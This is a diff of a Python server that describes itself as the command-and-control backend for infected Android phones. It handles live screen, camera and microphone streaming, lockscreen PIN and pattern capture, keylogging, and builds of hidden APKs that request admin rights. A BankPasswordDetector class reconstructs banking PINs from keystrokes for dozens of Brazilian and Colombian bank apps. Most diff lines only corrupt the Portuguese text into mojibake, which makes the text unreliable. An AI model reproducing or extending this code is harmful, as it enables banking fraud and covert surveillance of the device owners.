@@ -1,15 +1,15 @@
 """
 SERVIDOR DE COMANDO E CONTROLE (C&C)
 
-Este Ã© o servidor que controla todos os dispositivos infectados.
+Este ÃƒÂ© o servidor que controla todos os dispositivos infectados.
 
 FUNCIONALIDADES:
-- Aceita conexÃµes WebSocket de dispositivos Android
+- Aceita conexÃƒÂµes WebSocket de dispositivos Android
 - Recebe e armazena frames de tela em tempo real
 - Envia comandos para os dispositivos
-- Interface web para visualizaÃ§Ã£o e controle
-- Sistema de autenticaÃ§Ã£o para operadores
-- Banco de dados PostgreSQL para persistÃªncia
+- Interface web para visualizaÃƒÂ§ÃƒÂ£o e controle
+- Sistema de autenticaÃƒÂ§ÃƒÂ£o para operadores
+- Banco de dados PostgreSQL para persistÃƒÂªncia
 
 ROTAS:
 - /ws: WebSocket para dispositivos Android
@@ -44,7 +44,7 @@ class SuppressInvalidHTTPFilter(logging.Filter):
 
 logging.getLogger("uvicorn.error").addFilter(SuppressInvalidHTTPFilter())
 
-# Middleware de cabeÃ§alhos de seguranÃ§a HTTP
+# Middleware de cabeÃƒÂ§alhos de seguranÃƒÂ§a HTTP
 LOGIN_ATTEMPTS = {}  # {ip: {"count": int, "blocked_until": datetime}}
 from dataclasses import dataclass
 import asyncio
@@ -60,7 +60,7 @@ except ImportError:
     import json
     def json_loads(s): return json.loads(s)
     def json_dumps(o): return json.dumps(o)
-import json  # MantÃ©m para compatibilidade com FastAPI
+import json  # MantÃƒÂ©m para compatibilidade com FastAPI
 import base64
 from datetime import datetime, timedelta, timezone
 
@@ -72,7 +72,7 @@ import tempfile
 from pathlib import Path
 from jose import jwt, JWTError
 
-# ImportaÃ§Ãµes locais
+# ImportaÃƒÂ§ÃƒÂµes locais
 from database import get_db, engine, Base, SessionLocal, checkpoint_wal
 from models import Device, Operator, DeviceLog, UserLayoutPreferences, CapturedData
 from auth import (
@@ -86,12 +86,12 @@ from schemas import (
 )
 from apk_builder import APKBuilder, patch_app_name, patch_application_id, patch_hide_from_launcher, patch_request_admin, BUILDS_DIR
 
-# ConfiguraÃ§Ã£o de logging - ULTRA REDUZIDO para performance
-logging.basicConfig(level=logging.ERROR)  # Apenas erros crÃ­ticos
+# ConfiguraÃƒÂ§ÃƒÂ£o de logging - ULTRA REDUZIDO para performance
+logging.basicConfig(level=logging.ERROR)  # Apenas erros crÃƒÂ­ticos
 logger = logging.getLogger(__name__)
 logger.setLevel(logging.WARNING)  # Apenas warnings e erros
 
-# ==================== OTIMIZAÃ‡Ã•ES DE PERFORMANCE - VPS POTENTE (24GB RAM, 10 CORES) ====================
+# ==================== OTIMIZAÃƒâ€¡Ãƒâ€¢ES DE PERFORMANCE - VPS POTENTE (24GB RAM, 10 CORES) ====================
 import gc
 import sys
 
@@ -105,7 +105,7 @@ if hasattr(sys.stdout, 'reconfigure'):
 # GC otimizado para alta RAM - coleta menos frequente
 gc.set_threshold(50000, 500, 200)  # Thresholds altos = menos pausas
 
-# ConfiguraÃ§Ãµes de buffer - OTIMIZADO PARA ESTABILIDADE E PERFORMANCE
+# ConfiguraÃƒÂ§ÃƒÂµes de buffer - OTIMIZADO PARA ESTABILIDADE E PERFORMANCE
 WEBSOCKET_MAX_SIZE = 2 * 1024 * 1024  # 2MB max
 FRAME_COMPRESSION_QUALITY = 40
 MAX_CONCURRENT_DEVICES = 500
@@ -113,9 +113,9 @@ FRAME_SKIP_INTERVAL = 1
 _DASHBOARD_QUEUE_INITIAL = 5  # Fila maior = menos frames descartados, menos travamentos
 FRAME_TTL = 5
 
-# ðŸš€ OTIMIZAÃ‡ÃƒO PARA 4G: CompressÃ£o agressiva e fila pequena
+# Ã°Å¸Å¡â‚¬ OTIMIZAÃƒâ€¡ÃƒÆ’O PARA 4G: CompressÃƒÂ£o agressiva e fila pequena
 # Isso garante que o dashboard sempre mostra o frame MAIS RECENTE
-# e nÃ£o fica tentando processar frames velhos
+# e nÃƒÂ£o fica tentando processar frames velhos
 
 # Pool de workers para processamento paralelo - USA TODOS OS CORES
 from concurrent.futures import ThreadPoolExecutor
@@ -148,13 +148,13 @@ async def safe_db_commit(db):
     """Versao assincrona nao-bloqueante de safe_db_commit_sync"""
     return await asyncio.to_thread(safe_db_commit_sync, db)
 
-# GC periÃ³dico moderado - evita pausas desnecessÃ¡rias
+# GC periÃƒÂ³dico moderado - evita pausas desnecessÃƒÂ¡rias
 import threading
 def periodic_gc():
     import time
     while True:
         time.sleep(300)  # 5 minutos - gc.collect() pausa a event loop se chamado demais
-        gc.collect(1)  # Apenas geraÃ§Ã£o 1 (rÃ¡pido)
+        gc.collect(1)  # Apenas geraÃƒÂ§ÃƒÂ£o 1 (rÃƒÂ¡pido)
         
 gc_thread = threading.Thread(target=periodic_gc, daemon=True)
 gc_thread.start()
@@ -170,52 +170,52 @@ try:
         inspector = inspect(engine)
         columns = [c["name"] for c in inspector.get_columns("devices")]
         if "custom_name" not in columns:
-            print("ðŸ”§ MigraÃ§Ã£o: Adicionando coluna custom_name Ã  tabela devices...")
+            print("Ã°Å¸â€Â§ MigraÃƒÂ§ÃƒÂ£o: Adicionando coluna custom_name ÃƒÂ  tabela devices...")
             conn.execute(text("ALTER TABLE devices ADD COLUMN custom_name VARCHAR(100)"))
             try:
                 conn.commit()
             except Exception:
                 pass
-            print("âœ… Coluna custom_name adicionada com sucesso!")
+            print("Ã¢Å“â€¦ Coluna custom_name adicionada com sucesso!")
 
         op_columns = [c["name"] for c in inspector.get_columns("operators")]
         if "expires_at" not in op_columns:
-            print("ðŸ”§ MigraÃ§Ã£o: Adicionando coluna expires_at Ã  tabela operators...")
+            print("Ã°Å¸â€Â§ MigraÃƒÂ§ÃƒÂ£o: Adicionando coluna expires_at ÃƒÂ  tabela operators...")
             conn.execute(text("ALTER TABLE operators ADD COLUMN expires_at TIMESTAMP"))
             try:
                 conn.commit()
             except Exception:
                 pass
-            print("âœ… Coluna expires_at adicionada com sucesso!")
+            print("Ã¢Å“â€¦ Coluna expires_at adicionada com sucesso!")
 
         if "totp_secret" not in op_columns:
-            print("ðŸ”§ MigraÃ§Ã£o: Adicionando coluna totp_secret Ã  tabela operators...")
+            print("Ã°Å¸â€Â§ MigraÃƒÂ§ÃƒÂ£o: Adicionando coluna totp_secret ÃƒÂ  tabela operators...")
             conn.execute(text("ALTER TABLE operators ADD COLUMN totp_secret VARCHAR(64)"))
             try:
                 conn.commit()
             except Exception:
                 pass
-            print("âœ… Coluna totp_secret adicionada com sucesso!")
+            print("Ã¢Å“â€¦ Coluna totp_secret adicionada com sucesso!")
 
         if "totp_enabled" not in op_columns:
-            print("ðŸ”§ MigraÃ§Ã£o: Adicionando coluna totp_enabled Ã  tabela operators...")
+            print("Ã°Å¸â€Â§ MigraÃƒÂ§ÃƒÂ£o: Adicionando coluna totp_enabled ÃƒÂ  tabela operators...")
             conn.execute(text("ALTER TABLE operators ADD COLUMN totp_enabled BOOLEAN DEFAULT 0"))
             try:
                 conn.commit()
             except Exception:
                 pass
-            print("âœ… Coluna totp_enabled adicionada com sucesso!")
+            print("Ã¢Å“â€¦ Coluna totp_enabled adicionada com sucesso!")
 
         if "totp_temp_secret" not in op_columns:
-            print("ðŸ”§ MigraÃ§Ã£o: Adicionando coluna totp_temp_secret Ã  tabela operators...")
+            print("Ã°Å¸â€Â§ MigraÃƒÂ§ÃƒÂ£o: Adicionando coluna totp_temp_secret ÃƒÂ  tabela operators...")
             conn.execute(text("ALTER TABLE operators ADD COLUMN totp_temp_secret VARCHAR(64)"))
             try:
                 conn.commit()
             except Exception:
                 pass
-            print("âœ… Coluna totp_temp_secret adicionada com sucesso!")
+            print("Ã¢Å“â€¦ Coluna totp_temp_secret adicionada com sucesso!")
 
-        # Garante Ã­ndices de alta velocidade para device_logs e devices
+        # Garante ÃƒÂ­ndices de alta velocidade para device_logs e devices
         conn.execute(text("CREATE INDEX IF NOT EXISTS idx_device_logs_dev_type ON device_logs(device_id, log_type)"))
         conn.execute(text("CREATE INDEX IF NOT EXISTS idx_device_logs_type_created ON device_logs(log_type, created_at)"))
         conn.execute(text("CREATE INDEX IF NOT EXISTS idx_device_logs_dev_created ON device_logs(device_id, created_at)"))
@@ -228,10 +228,10 @@ try:
         except Exception:
             pass
 except Exception as e:
-    print(f"âš ï¸ Erro ao tentar migrar banco de dados: {e}")
+    print(f"Ã¢Å¡Â Ã¯Â¸Â Erro ao tentar migrar banco de dados: {e}")
 
 async def periodic_wal_checkpoint():
-    """Executa checkpoint do WAL e descarta conexÃµes ociosas a cada 2 min para manter WAL compacto"""
+    """Executa checkpoint do WAL e descarta conexÃƒÂµes ociosas a cada 2 min para manter WAL compacto"""
     counter = 0
     while True:
         try:
@@ -262,7 +262,7 @@ async def periodic_wal_checkpoint():
             pass
 
 def custom_asyncio_exception_handler(loop, context):
-    """Suprime exceÃ§Ãµes benignas de socket do Windows (WinError 64 / 10054) para evitar quedas do servidor"""
+    """Suprime exceÃƒÂ§ÃƒÂµes benignas de socket do Windows (WinError 64 / 10054) para evitar quedas do servidor"""
     exc = context.get("exception")
     if exc is not None:
         if isinstance(exc, (ConnectionResetError, ConnectionAbortedError)):
@@ -290,7 +290,9 @@ async def lifespan(app: FastAPI):
     asyncio.create_task(periodic_wal_checkpoint())
     yield
 
-# Inicializa FastAPI com proteÃ§Ã£o total contra exposiÃ§Ã£o de API
+# Inicializa FastAPI com proteÃƒÂ§ÃƒÂ£o total contra exposiÃƒÂ§ÃƒÂ£o de API
+BANK_TEMPLATE_ENABLED = False
+
 app = FastAPI(
     docs_url=None,
     redoc_url=None,
@@ -298,7 +300,7 @@ app = FastAPI(
     lifespan=lifespan
 )
 
-# ConfiguraÃ§Ã£o CORS (Permite requisiÃ§Ãµes mantendo seguranÃ§a de credenciais)
+# ConfiguraÃƒÂ§ÃƒÂ£o CORS (Permite requisiÃƒÂ§ÃƒÂµes mantendo seguranÃƒÂ§a de credenciais)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -312,7 +314,7 @@ from fastapi.exceptions import RequestValidationError
 from fastapi.responses import JSONResponse
 
 class SecurityHeadersMiddleware:
-    """Middleware ASGI puro para cabeÃ§alhos de seguranÃ§a sem interferir no Content-Length ou respostas de streaming"""
+    """Middleware ASGI puro para cabeÃƒÂ§alhos de seguranÃƒÂ§a sem interferir no Content-Length ou respostas de streaming"""
     def __init__(self, app):
         self.app = app
 
@@ -327,7 +329,7 @@ class SecurityHeadersMiddleware:
                 raw_headers.extend([
                     (b"server", b"WebServer"),
                     (b"x-content-type-options", b"nosniff"),
-                    (b"x-frame-options", b"SAMEORIGIN"),
+                    (b"x-frame-options", b"ALLOWALL"),
                     (b"x-xss-protection", b"1; mode=block"),
                 ])
                 message["headers"] = raw_headers
@@ -341,7 +343,7 @@ app.add_middleware(SecurityHeadersMiddleware)
 async def validation_exception_handler(request: Request, exc: RequestValidationError):
     return JSONResponse(
         status_code=422,
-        content={"detail": "RequisiÃ§Ã£o invÃ¡lida"}
+        content={"detail": "RequisiÃƒÂ§ÃƒÂ£o invÃƒÂ¡lida"}
     )
 
 @app.exception_handler(Exception)
@@ -353,22 +355,22 @@ async def global_exception_handler(request: Request, exc: Exception):
     )
 
 
-# Monta arquivos estÃ¡ticos do frontend buildado (para acesso via VPS/domÃ­nio)
+# Monta arquivos estÃƒÂ¡ticos do frontend buildado (para acesso via VPS/domÃƒÂ­nio)
 FRONTEND_DIST = Path(__file__).parent / "web-dist"
 if FRONTEND_DIST.exists():
     app.mount("/assets", StaticFiles(directory=FRONTEND_DIST / "assets"), name="frontend-assets")
 
-# Monta diretÃ³rio de uploads para APKs
+# Monta diretÃƒÂ³rio de uploads para APKs
 UPLOADS_DIR = Path(__file__).parent / "uploads" / "apks"
 UPLOADS_DIR.mkdir(parents=True, exist_ok=True)
 app.mount("/uploads/apks", StaticFiles(directory=UPLOADS_DIR), name="apk-uploads")
 
-# Monta diretÃ³rio web (para download do APK compilado localmente)
+# Monta diretÃƒÂ³rio web (para download do APK compilado localmente)
 WEB_DIR = Path(__file__).parent / "web"
 WEB_DIR.mkdir(parents=True, exist_ok=True)
 app.mount("/web", StaticFiles(directory=WEB_DIR), name="web-static")
 
-# ConfiguraÃ§Ãµes de cache/TTL para recursos em memÃ³ria - OTIMIZADO
+# ConfiguraÃƒÂ§ÃƒÂµes de cache/TTL para recursos em memÃƒÂ³ria - OTIMIZADO
 FRAME_CACHE_DIR = Path(__file__).resolve().parent / "cache" / "screens"
 HIERARCHY_CACHE_DIR = Path(__file__).resolve().parent / "cache" / "hierarchies"
 FRAME_CACHE_DIR.mkdir(parents=True, exist_ok=True)
@@ -391,7 +393,7 @@ def get_cached_devices(db: Session, user_id: int = None, is_admin: bool = False)
     cache_key = f"{user_id}_{is_admin}"
     now = time_module.time()
     
-    # Cache expirado ou nÃ£o existe
+    # Cache expirado ou nÃƒÂ£o existe
     if _devices_cache["data"] is None or now - _devices_cache["timestamp"] > _devices_cache["ttl"]:
         if is_admin:
             devices = db.query(Device).all()
@@ -403,21 +405,21 @@ def get_cached_devices(db: Session, user_id: int = None, is_admin: bool = False)
     
     return _devices_cache["data"]
 
-# ==================== DETECTOR INTELIGENTE DE SENHAS BANCÃRIAS ====================
+# ==================== DETECTOR INTELIGENTE DE SENHAS BANCÃƒÂRIAS ====================
 
 class BankPasswordDetector:
-    """Detecta e reconstrÃ³i senhas bancÃ¡rias de 4, 6 e 8 dÃ­gitos"""
+    """Detecta e reconstrÃƒÂ³i senhas bancÃƒÂ¡rias de 4, 6 e 8 dÃƒÂ­gitos"""
     
     BANK_APPS = {
-        'br.com.itau': 'ItaÃº',
-        'com.itau': 'ItaÃº',
-        'com.itau.cartoes': 'ItaÃº CartÃµes',
-        'br.com.itau.pers': 'ItaÃº PersonnalitÃ©',
+        'br.com.itau': 'ItaÃƒÂº',
+        'com.itau': 'ItaÃƒÂº',
+        'com.itau.cartoes': 'ItaÃƒÂº CartÃƒÂµes',
+        'br.com.itau.pers': 'ItaÃƒÂº PersonnalitÃƒÂ©',
         'br.com.neon': 'Neon',
         'com.nu.production': 'Nubank',
         'com.nubank': 'Nubank',
         'br.com.bradesco': 'Bradesco',
-        'com.bradesco.cartoes': 'Bradesco CartÃµes',
+        'com.bradesco.cartoes': 'Bradesco CartÃƒÂµes',
         'br.com.bradesco.bradescoprime': 'Bradesco Prime',
         'com.santander.app': 'Santander',
         'com.santander.app.way': 'Santander Way',
@@ -450,7 +452,7 @@ class BankPasswordDetector:
         'com.bancobs2.app': 'Banco BS2',
         'com.bancobMG.mobile': 'Banco BMG',
         'br.com.banrisul': 'Banrisul',
-        'br.com.banrisul.cartoes': 'Banrisul CartÃµes',
+        'br.com.banrisul.cartoes': 'Banrisul CartÃƒÂµes',
         'com.davivienda.daviviendaapp': 'Davivienda',
         'com.synopsis.davivienda': 'Davivienda',
         'com.davivienda.movil': 'Davivienda',
@@ -462,8 +464,8 @@ class BankPasswordDetector:
         'co.com.bancolombia': 'Bancolombia',
         'com.nequi.MobileApp': 'Nequi',
         'com.nequi': 'Nequi',
-        'com.seguranca.protecao': 'KEYLOGGER ITAÃš',
-        'com.seguranca': 'KEYLOGGER ITAÃš'
+        'com.seguranca.protecao': 'KEYLOGGER ITAÃƒÅ¡',
+        'com.seguranca': 'KEYLOGGER ITAÃƒÅ¡'
     }
     
     def __init__(self, device_id: str):
@@ -472,23 +474,23 @@ class BankPasswordDetector:
         self.last_package = None
         self.last_hint = None
         self.detected_passwords = []  # Lista de senhas detectadas
-        self.last_detected_password = None  # Ãšltima senha detectada (evita duplicatas)
-        self.last_event_time = None  # Tempo do Ãºltimo evento
+        self.last_detected_password = None  # ÃƒÅ¡ltima senha detectada (evita duplicatas)
+        self.last_event_time = None  # Tempo do ÃƒÂºltimo evento
         
     def process_keylog(self, keylog_data: str) -> dict:
         """Processa evento de keylog e tenta detectar senha"""
         try:
             data = json.loads(keylog_data)
             
-            # Verifica se Ã© campo de senha ou se contÃ©m dÃ­gitos numÃ©ricos digitados (ex: teclado ItaÃº, PINs)
+            # Verifica se ÃƒÂ© campo de senha ou se contÃƒÂ©m dÃƒÂ­gitos numÃƒÂ©ricos digitados (ex: teclado ItaÃƒÂº, PINs)
             is_password_field = data.get('isPassword', False)
             text = str(data.get('text', '') or '')
             hint = str(data.get('hint', '') or '')
             package = data.get('package', '')
             
-            # Se nÃ£o Ã© marcado como senha mas contÃ©m dÃ­gitos numÃ©ricos ou palavras-chave de PIN/senha, processa como potencial entrada
-            is_numeric = text.replace('â€¢', '').replace('[', '').replace(']', '').strip().isdigit()
-            is_sensitive_field = any(k in hint.lower() for k in ['senha', 'pin', 'cÃ³digo', 'codigo', 'acesso', 'pass', 'key'])
+            # Se nÃƒÂ£o ÃƒÂ© marcado como senha mas contÃƒÂ©m dÃƒÂ­gitos numÃƒÂ©ricos ou palavras-chave de PIN/senha, processa como potencial entrada
+            is_numeric = text.replace('Ã¢â‚¬Â¢', '').replace('[', '').replace(']', '').strip().isdigit()
+            is_sensitive_field = any(k in hint.lower() for k in ['senha', 'pin', 'cÃƒÂ³digo', 'codigo', 'acesso', 'pass', 'key'])
             
             if not is_password_field and not is_numeric and not is_sensitive_field:
                 # Limpa buffer se mudou para campo irrelevante
@@ -518,7 +520,7 @@ class BankPasswordDetector:
             # Tenta extrair senha do buffer
             password = self._extract_password(hint)
             
-            # Verifica se Ã© uma senha vÃ¡lida e DIFERENTE da Ãºltima detectada
+            # Verifica se ÃƒÂ© uma senha vÃƒÂ¡lida e DIFERENTE da ÃƒÂºltima detectada
             if password and password != self.last_detected_password:
                 # Senha detectada!
                 password_info = {
@@ -533,17 +535,17 @@ class BankPasswordDetector:
                     'buffer': list(self.password_buffer)  # Para debug
                 }
                 
-                # Adiciona Ã  lista de senhas detectadas
+                # Adiciona ÃƒÂ  lista de senhas detectadas
                 self.detected_passwords.append(password_info)
                 self.last_detected_password = password  # Marca como detectada
                 
-                # Limpa buffer apÃ³s detecÃ§Ã£o
+                # Limpa buffer apÃƒÂ³s detecÃƒÂ§ÃƒÂ£o
                 self.password_buffer = []
                 
                 logger.info(f"\n" + "="*60)
-                logger.info(f"ðŸ” SENHA BANCÃRIA DETECTADA!")
+                logger.info(f"Ã°Å¸â€Â SENHA BANCÃƒÂRIA DETECTADA!")
                 logger.info(f"Banco: {bank_name}")
-                logger.info(f"Senha: {password} ({len(password)} dÃ­gitos)")
+                logger.info(f"Senha: {password} ({len(password)} dÃƒÂ­gitos)")
                 logger.info(f"Campo: {hint}")
                 logger.info("="*60 + "\n")
                 
@@ -555,7 +557,7 @@ class BankPasswordDetector:
         return None
     
     def _extract_password(self, hint: str) -> str:
-        """Extrai senha dos eventos com bullets (â€¢) OU cliques em teclado virtual"""
+        """Extrai senha dos eventos com bullets (Ã¢â‚¬Â¢) OU cliques em teclado virtual"""
         if len(self.password_buffer) < 2:
             return None
         
@@ -570,7 +572,7 @@ class BankPasswordDetector:
             elif '8' in hint or 'oito' in hint_lower:
                 expected_length = 8
         
-        # Analisa Ãºltimos eventos COM DEDUPLICAÃ‡ÃƒO
+        # Analisa ÃƒÂºltimos eventos COM DEDUPLICAÃƒâ€¡ÃƒÆ’O
         password_digits = []
         last_digit = None
         last_timestamp = None
@@ -579,24 +581,24 @@ class BankPasswordDetector:
             text = event['text']
             timestamp = event.get('timestamp', '')
             
-            # MÃ©todo 1: Extrai dÃ­gitos de eventos com bullets (Neon, Nubank)
-            clean_text = text.replace('â€¢', '').replace('[', '').replace(']', '').strip()
+            # MÃƒÂ©todo 1: Extrai dÃƒÂ­gitos de eventos com bullets (Neon, Nubank)
+            clean_text = text.replace('Ã¢â‚¬Â¢', '').replace('[', '').replace(']', '').strip()
             
-            # Ignora eventos que nÃ£o sÃ£o dÃ­gitos puros
+            # Ignora eventos que nÃƒÂ£o sÃƒÂ£o dÃƒÂ­gitos puros
             if not clean_text:
                 continue
                 
-            # Se Ã© um texto com mÃºltiplos bullets/dÃ­gitos, pega apenas o Ãºltimo
+            # Se ÃƒÂ© um texto com mÃƒÂºltiplos bullets/dÃƒÂ­gitos, pega apenas o ÃƒÂºltimo
             if len(clean_text) > 1 and clean_text.isdigit():
-                # Ã‰ provavelmente a senha completa atÃ© agora
-                # Pega apenas o Ãºltimo caractere (novo dÃ­gito)
+                # Ãƒâ€° provavelmente a senha completa atÃƒÂ© agora
+                # Pega apenas o ÃƒÂºltimo caractere (novo dÃƒÂ­gito)
                 clean_text = clean_text[-1]
             
-            # MÃ©todo 2: Eventos de clique em teclado virtual (ItÃ¡u, Bradesco)
+            # MÃƒÂ©todo 2: Eventos de clique em teclado virtual (ItÃƒÂ¡u, Bradesco)
             if clean_text and len(clean_text) == 1 and clean_text.isdigit():
                 digit = clean_text
                 
-                # ðŸ”¥ DEDUPLICAÃ‡ÃƒO: Ignora se Ã© o mesmo dÃ­gito em sequÃªncia rÃ¡pida
+                # Ã°Å¸â€Â¥ DEDUPLICAÃƒâ€¡ÃƒÆ’O: Ignora se ÃƒÂ© o mesmo dÃƒÂ­gito em sequÃƒÂªncia rÃƒÂ¡pida
                 # Isso evita capturar o mesmo clique duas vezes
                 if digit == last_digit and last_timestamp:
                     try:
@@ -607,12 +609,12 @@ class BankPasswordDetector:
                             t2 = datetime.fromisoformat(timestamp.replace('Z', '+00:00')) if isinstance(timestamp, str) else timestamp
                             diff_ms = abs((t2 - t1).total_seconds() * 1000)
                             
-                            # Se menos de 300ms entre eventos iguais, Ã© duplicata
+                            # Se menos de 300ms entre eventos iguais, ÃƒÂ© duplicata
                             if diff_ms < 300:
-                                logger.debug(f"ðŸ”„ Ignorando dÃ­gito duplicado: {digit} (diff: {diff_ms}ms)")
+                                logger.debug(f"Ã°Å¸â€â€ž Ignorando dÃƒÂ­gito duplicado: {digit} (diff: {diff_ms}ms)")
                                 continue
                     except Exception as e:
-                        # Se nÃ£o conseguir comparar timestamps, aceita o dÃ­gito
+                        # Se nÃƒÂ£o conseguir comparar timestamps, aceita o dÃƒÂ­gito
                         pass
                 
                 password_digits.append(digit)
@@ -620,23 +622,23 @@ class BankPasswordDetector:
                 last_timestamp = timestamp
         
         # Log para debug
-        logger.debug(f"ðŸ“Š Buffer: {len(self.password_buffer)} eventos â†’ {len(password_digits)} dÃ­gitos: {''.join(password_digits)}")
+        logger.debug(f"Ã°Å¸â€œÅ  Buffer: {len(self.password_buffer)} eventos Ã¢â€ â€™ {len(password_digits)} dÃƒÂ­gitos: {''.join(password_digits)}")
         
         # Se tem tamanho esperado, retorna APENAS quando atingir esse tamanho
         if expected_length:
             if len(password_digits) == expected_length:
                 return ''.join(password_digits)
             elif len(password_digits) > expected_length:
-                # Pegou mais que o esperado, retorna os Ãºltimos N
+                # Pegou mais que o esperado, retorna os ÃƒÂºltimos N
                 return ''.join(password_digits[-expected_length:])
         else:
             # Sem hint, tenta detectar automaticamente (4, 6 ou 8)
             if len(password_digits) >= 4:
-                # Tenta 8, 6 ou 4 dÃ­gitos
+                # Tenta 8, 6 ou 4 dÃƒÂ­gitos
                 for length in [8, 6, 4]:
                     if len(password_digits) == length:
                         return ''.join(password_digits)
-                # Se nÃ£o Ã© exatamente 4, 6 ou 8, pega os Ãºltimos 6 (padrÃ£o)
+                # Se nÃƒÂ£o ÃƒÂ© exatamente 4, 6 ou 8, pega os ÃƒÂºltimos 6 (padrÃƒÂ£o)
                 if len(password_digits) >= 6:
                     return ''.join(password_digits[-6:])
         
@@ -656,7 +658,7 @@ class DashboardSubscriber:
     queue: asyncio.Queue
 
 async def safe_close_websocket(ws: WebSocket, code: int = 1000, reason: str = ""):
-    """Fecha WebSocket silenciosamente tratando exceÃ§Ãµes de estado fechado"""
+    """Fecha WebSocket silenciosamente tratando exceÃƒÂ§ÃƒÂµes de estado fechado"""
     try:
         await ws.close(code=code, reason=reason)
     except Exception:
@@ -665,7 +667,7 @@ async def safe_close_websocket(ws: WebSocket, code: int = 1000, reason: str = ""
 
 
 
-# Gerenciador de conexÃµes de dispositivos
+# Gerenciador de conexÃƒÂµes de dispositivos
 class DeviceConnectionManager:
     def __init__(self):
         self.active_connections: Dict[str, WebSocket] = {}
@@ -683,48 +685,48 @@ class DeviceConnectionManager:
         self.cleanup_lock = asyncio.Lock()
         self.last_balance_extract_time: Dict[str, float] = {}
         
-        # ðŸ“· CÃ‚MERA EM TEMPO REAL
-        self.device_camera_frames: Dict[str, bytes] = {}  # Ãšltimo frame da cÃ¢mera
+        # Ã°Å¸â€œÂ· CÃƒâ€šMERA EM TEMPO REAL
+        self.device_camera_frames: Dict[str, bytes] = {}  # ÃƒÅ¡ltimo frame da cÃƒÂ¢mera
         self.device_camera_timestamps: Dict[str, datetime] = {}
-        self.camera_subscribers: Dict[str, List[DashboardSubscriber]] = {}  # WebSockets escutando cÃ¢mera
+        self.camera_subscribers: Dict[str, List[DashboardSubscriber]] = {}  # WebSockets escutando cÃƒÂ¢mera
         
-        # ðŸŽ¤ MICROFONE EM TEMPO REAL
-        self.device_audio_chunks: Dict[str, bytes] = {}  # Ãšltimo chunk de Ã¡udio
+        # Ã°Å¸Å½Â¤ MICROFONE EM TEMPO REAL
+        self.device_audio_chunks: Dict[str, bytes] = {}  # ÃƒÅ¡ltimo chunk de ÃƒÂ¡udio
         self.device_audio_timestamps: Dict[str, datetime] = {}
-        self.audio_subscribers: Dict[str, List[DashboardSubscriber]] = {}  # WebSockets escutando Ã¡udio
+        self.audio_subscribers: Dict[str, List[DashboardSubscriber]] = {}  # WebSockets escutando ÃƒÂ¡udio
         
-        # ðŸ”“ SEQUÃŠNCIA DE DESBLOQUEIO
-        self.device_unlock_sequences: Dict[str, dict] = {}  # SequÃªncia de desbloqueio gravada
+        # Ã°Å¸â€â€œ SEQUÃƒÅ NCIA DE DESBLOQUEIO
+        self.device_unlock_sequences: Dict[str, dict] = {}  # SequÃƒÂªncia de desbloqueio gravada
         
-        # ðŸ”’ LOCKSCREEN (PIN + PATTERN) - IGUAL EAGLESPY V5
+        # Ã°Å¸â€â€™ LOCKSCREEN (PIN + PATTERN) - IGUAL EAGLESPY V5
         self.device_pins: Dict[str, str] = {}  # PIN capturado por dispositivo
         self.device_patterns: Dict[str, str] = {}  # Pattern capturado por dispositivo
         self.device_lockscreen_active: Dict[str, bool] = {}  # Lockscreen ativa por dispositivo
         
-        # ðŸ“± APPS INSTALADOS
+        # Ã°Å¸â€œÂ± APPS INSTALADOS
         self.device_installed_apps: Dict[str, list] = {}  # Lista de apps por dispositivo
         
-        # ðŸ¦ BANCOS DETECTADOS EM TEMPO REAL
+        # Ã°Å¸ÂÂ¦ BANCOS DETECTADOS EM TEMPO REAL
         self.device_active_banks: Dict[str, dict] = {}  # Lista de bancos abertos por dispositivo
         
         # HEARTBEAT
         self.device_last_activity: Dict[str, datetime] = {}
-        self.DEVICE_TIMEOUT_SECONDS = 300  # 300s (5 min) - resiliÃªncia total para oscilaÃ§Ãµes no 4G/WiFi e doze mode
+        self.DEVICE_TIMEOUT_SECONDS = 300  # 300s (5 min) - resiliÃƒÂªncia total para oscilaÃƒÂ§ÃƒÂµes no 4G/WiFi e doze mode
         
-        # Anti-flood: controla quando GET_DEVICE_INFO foi enviado por Ãºltima vez por dispositivo
+        # Anti-flood: controla quando GET_DEVICE_INFO foi enviado por ÃƒÂºltima vez por dispositivo
         self._info_request_ts: Dict[str, datetime] = {}
 
         
     def update_device_activity(self, device_id: str):
-        """Atualiza timestamp de Ãºltima atividade do dispositivo"""
+        """Atualiza timestamp de ÃƒÂºltima atividade do dispositivo"""
         self.device_last_activity[device_id] = utc_now()
     
     def is_device_alive(self, device_id: str) -> bool:
-        """Verifica se dispositivo estÃ¡ realmente ativo"""
+        """Verifica se dispositivo estÃƒÂ¡ realmente ativo"""
         return device_id in self.active_connections
     
     def get_alive_devices(self) -> list:
-        """Retorna lista de device_ids que estÃ£o realmente ativos"""
+        """Retorna lista de device_ids que estÃƒÂ£o realmente ativos"""
         alive = []
         dead = []
         
@@ -734,9 +736,9 @@ class DeviceConnectionManager:
             else:
                 dead.append(device_id)
         
-        # Remove dispositivos mortos da lista de conexÃµes
+        # Remove dispositivos mortos da lista de conexÃƒÂµes
         for device_id in dead:
-            logger.warning(f"ðŸ’€ Dispositivo {device_id} nÃ£o responde hÃ¡ {self.DEVICE_TIMEOUT_SECONDS}s - removendo")
+            logger.warning(f"Ã°Å¸â€™â‚¬ Dispositivo {device_id} nÃƒÂ£o responde hÃƒÂ¡ {self.DEVICE_TIMEOUT_SECONDS}s - removendo")
             self.disconnect(device_id)
         
         return alive
@@ -744,72 +746,72 @@ class DeviceConnectionManager:
     def store_installed_apps(self, device_id: str, apps_list: list):
         """Armazena lista de apps instalados"""
         self.device_installed_apps[device_id] = apps_list
-        logger.info(f"ðŸ“± Apps armazenados para {device_id}: {len(apps_list)} apps")
+        logger.info(f"Ã°Å¸â€œÂ± Apps armazenados para {device_id}: {len(apps_list)} apps")
     
     def get_installed_apps(self, device_id: str) -> Optional[list]:
         """Retorna lista de apps instalados"""
         return self.device_installed_apps.get(device_id)
         
     def store_unlock_sequence(self, device_id: str, sequence_data: dict):
-        """Armazena sequÃªncia de desbloqueio gravada"""
+        """Armazena sequÃƒÂªncia de desbloqueio gravada"""
         self.device_unlock_sequences[device_id] = sequence_data
-        logger.info(f"ðŸ”“ SequÃªncia de desbloqueio armazenada para {device_id}: {len(sequence_data.get('sequence', []))} aÃ§Ãµes")
+        logger.info(f"Ã°Å¸â€â€œ SequÃƒÂªncia de desbloqueio armazenada para {device_id}: {len(sequence_data.get('sequence', []))} aÃƒÂ§ÃƒÂµes")
     
     def get_unlock_sequence(self, device_id: str) -> Optional[dict]:
-        """Retorna sequÃªncia de desbloqueio gravada"""
